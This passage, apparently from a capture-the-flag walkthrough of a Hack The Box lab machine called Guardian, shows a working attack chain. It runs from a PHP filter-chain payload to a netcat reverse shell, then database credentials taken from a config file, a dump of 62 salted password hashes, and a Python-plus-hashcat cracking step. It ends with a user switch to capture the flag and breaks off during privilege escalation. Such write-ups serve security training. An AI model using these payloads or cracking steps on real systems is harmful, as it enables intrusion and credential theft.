UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp,system.php
```
(don't forget to add ,system.php at the end, otherwise t won't work)
```shell
nc -lvnp 9001
```

## Shell as www-data

got shell as www-data!
```shell
└──╼ [★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.152] from (UNKNOWN) [10.129.237.248] 37842
bash: cannot set terminal process group (1168): Inappropriate ioctl for device
bash: no job control in this shell
www-data@guardian:~/portal.guardian.htb/admin$ 
```

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Whats next? well i remember from the file of the source code that i found some DB creds , 
```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];

---

$password = hash('sha256', $password . $salt);
```

### Enumerating the DB

lets try using them:
```shell
mysql -u root -p
Gu4rd14n_un1_1s_th3_b3st
```
show databases
```shell
mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> 
```

according to the php file we have found, the dbname was `guardiandb` so lets choose that
```shell
mysql> use guardiandb
use guardiandb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
show tables
```shell
mysql> SHOW TABLES;
SHOW TABLES;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.01 sec)

```

#### Extracting password hashes + salt

view values
```shell
mysql> select username,password_hash from users;
select username,password_hash from users;
+--------------------+-----------------------------------------------------------------+
| username          | password_hash                                                    |
+--------------------+-----------------------------------------------------------------+
| admin             | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson    | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter    | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby   | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin      | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon     | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth       | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat       | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
| crin.hambidge     | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |
| myra.galsworthy   | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |
| mireielle.feek    | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |
| vivie.smallthwaite| b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |
| GU0142023         | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 |
| GU6262023         | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f |
| GU0702025         | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 |
| GU0762023         | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 |
| GU9492024         | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 |
| GU9612024         | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 |
| GU7382024         | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a |
| GU6632023         | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 |
| GU1922024         | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd |
| GU8032023         | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada |
| GU5852023         | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a |
| GU0712023         | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a |
| GU1592025         | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 |
| GU1112023         | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d |
| GU6432025         | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 |
| GU3042024         | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab |
| GU1482025         | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f |
| GU3102024         | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 |
| GU7232023         | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 |
| GU8912024         | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 |
| GU4752025         | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a |
| GU9602024         | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 |
| GU4382025         | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 |
| GU7352023         | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 |
| GU3042025         | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f |
| GU3872024         | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a |
| GU7462025         | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa |
| GU3902023         | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b |
| GU1832025         | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f |
| GU3052024         | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f |
| GU3612023         | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a |
| GU7022023         | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 |
| GU1712025         | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 |
| GU9362023         | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 |
| GU5092024         | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 |
| GU5252023         | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa |
| GU8802025         | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 |
| GU2222023         | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd |
| GU9802023         | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c |
| GU3122025         | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a |
| GU2062025         | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 |
| GU3992025         | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 |
| GU1662024         | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 |
| GU9972025         | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 |
| GU6822025         | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 |
| GU7912023         | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 |
| GU3622024         | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf |
| GU2002023         | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 |
| GU3052023         | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 |
| GU1462023         | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 |
+--------------------+-----------------------------------------------------------------+
62 rows in set (0.00 sec)
```

In `creatuser.php`, we know that the password generation logic is to add salt SHA256, and the salt value is in `config.php`

```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];

---

$password = hash('sha256', $password . $salt);
```

Logic: cleartext password + salt → SHA256. You can write a python script to blast (of course john, hashcat will also work)

then i wrote a script to convert the mysql output above to this format `hash:salt`

### Formatting MySQL output for cracking

`mysql_to_hashcat.py`
```python
#!/usr/bin/env python3

SALT = "8Sb)tM1vs1SS"

input_file = "mysql_dump.txt"
output_file = "hashes.txt"

with open(input_file, "r") as f, open(output_file, "w") as out:
    for line in f:
        line = line.strip()

        # skip table borders, headers, empty lines
        if not line or line.startswith("+") or line.startswith("| username"):
            continue

        # expected format:
        # | username | hash |
        parts = [p.strip() for p in line.strip("|").split("|")]
        if len(parts) != 2:
            continue

        username, hashval = parts
        out.write(f"{hashval}:{SALT}\n")

print(f"[+] Written hashes to {output_file}")
print("[!] Remember to replace SALT with the real value")
```

`mysql_dump.txt`
```shell
+--------------------+-----------------------------------------------------------------+
| username          | password_hash                                                    |
+--------------------+-----------------------------------------------------------------+
| admin             | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson    | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter    | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby   | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin      | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon     | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth       | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat       | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
| crin.hambidge     | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |
| myra.galsworthy   | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |
| mireielle.feek    | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |
| vivie.smallthwaite| b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |
| GU0142023         | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 |
| GU6262023         | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f |
| GU0702025         | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 |
| GU0762023         | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 |
| GU9492024         | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 |
| GU9612024         | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 |
| GU7382024         | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a |
| GU6632023         | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 |
| GU1922024         | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd |
| GU8032023         | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada |
| GU5852023         | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a |
| GU0712023         | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a |
| GU1592025         | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 |
| GU1112023         | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d |
| GU6432025         | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 |
| GU3042024         | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab |
| GU1482025         | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f |
| GU3102024         | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 |
| GU7232023         | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 |
| GU8912024         | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 |
| GU4752025         | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a |
| GU9602024         | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 |
| GU4382025         | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 |
| GU7352023         | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 |
| GU3042025         | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f |
| GU3872024         | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a |
| GU7462025         | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa |
| GU3902023         | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b |
| GU1832025         | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f |
| GU3052024         | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f |
| GU3612023         | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a |
| GU7022023         | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 |
| GU1712025         | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 |
| GU9362023         | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 |
| GU5092024         | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 |
| GU5252023         | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa |
| GU8802025         | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 |
| GU2222023         | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd |
| GU9802023         | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c |
| GU3122025         | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a |
| GU2062025         | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 |
| GU3992025         | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 |
| GU1662024         | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 |
| GU9972025         | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 |
| GU6822025         | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 |
| GU7912023         | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 |
| GU3622024         | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf |
| GU2002023         | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 |
| GU3052023         | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 |
| GU1462023         | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 |
+--------------------+-----------------------------------------------------------------+
```
run
```shell
└──╼ [★]$ python3 mysql_to_hashcat.py
[+] Written hashes to hashes.txt
[!] Remember to replace SALT with the real value
```
so the content output file is: `hashes.txt`
```shell
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6:8Sb)tM1vs1SS
7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61:8Sb)tM1vs1SS
4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471:8Sb)tM1vs1SS
23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6:8Sb)tM1vs1SS
c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8Sb)tM1vs1SS
ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829:8Sb)tM1vs1SS
87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f:8Sb)tM1vs1SS
48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1:8Sb)tM1vs1SS
e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2:8Sb)tM1vs1SS
8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1:8Sb)tM1vs1SS
cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57:8Sb)tM1vs1SS
7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a:8Sb)tM1vs1SS
98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714:8Sb)tM1vs1SS
bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd:8Sb)tM1vs1SS
41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada:8Sb)tM1vs1SS
e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a:8Sb)tM1vs1SS
e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a:8Sb)tM1vs1SS
1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71:8Sb)tM1vs1SS
168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d:8Sb)tM1vs1SS
a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6:8Sb)tM1vs1SS
d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab:8Sb)tM1vs1SS
be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f:8Sb)tM1vs1SS
3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706:8Sb)tM1vs1SS
4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6:8Sb)tM1vs1SS
6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51:8Sb)tM1vs1SS
4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a:8Sb)tM1vs1SS
6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2:8Sb)tM1vs1SS
8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8:8Sb)tM1vs1SS
8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005:8Sb)tM1vs1SS
1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f:8Sb)tM1vs1SS
12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a:8Sb)tM1vs1SS
5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa:8Sb)tM1vs1SS
6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b:8Sb)tM1vs1SS
6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f:8Sb)tM1vs1SS
1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f:8Sb)tM1vs1SS
7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a:8Sb)tM1vs1SS
7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8:8Sb)tM1vs1SS
ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225:8Sb)tM1vs1SS
8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592:8Sb)tM1vs1SS
11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380:8Sb)tM1vs1SS
70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa:8Sb)tM1vs1SS
7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76:8Sb)tM1vs1SS
d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd:8Sb)tM1vs1SS
a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c:8Sb)tM1vs1SS
e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a:8Sb)tM1vs1SS
0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8:8Sb)tM1vs1SS
b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0:8Sb)tM1vs1SS
5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5:8Sb)tM1vs1SS
339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599:8Sb)tM1vs1SS
298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482:8Sb)tM1vs1SS
8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021:8Sb)tM1vs1SS
1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf:8Sb)tM1vs1SS
3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2:8Sb)tM1vs1SS
2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8:8Sb)tM1vs1SS
585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202:8Sb)tM1vs1SS
```

## Cracking hashes

```shell
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

```shell
hashcat -m 1410 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
crack was successfull
```shell
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
```
and by correlating the hashes with the usernames from the mysql output we now have:
#### creds obtained
```shell
admin
fakebake000

jamil.enockson
copperhouse56
```
since we already have shell as `www-data` lets try changing user, but first, lets see what is the actual username on the host by inspecting the `/home` dir:
```shell
www-data@guardian:~/portal.guardian.htb/admin$ cd /home
cd /home
www-data@guardian:/home$ ls
ls
gitea  jamil  mark  sammy
```

## Shell as jamil

so lets try `jamil`
```shell
www-data@guardian:/home$ su jamil
su jamil
Password: copperhouse56

jamil@guardian:/home$ whoami
whoami
jamil
```
we are now logged in as jamil, lets grab the user flag
```shell
jamil@guardian:/home$ cd jamil
cd jamil
jamil@guardian:~$ ls
ls
user.txt
jamil@guardian:~$ cat user.txt
cat user.txt
2d3dcfbee26a68ef84fe9ef438ea935d
```

----------
# Privesc

In order to have a more stable shell, i ssh'ed into jamil and continued
```shell
ssh jamil@guardian.htb
```

## sudo -l as jamil

```shell
jamil@guardian:~$ sudo -l
sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jamil may run the following commands on guardian:
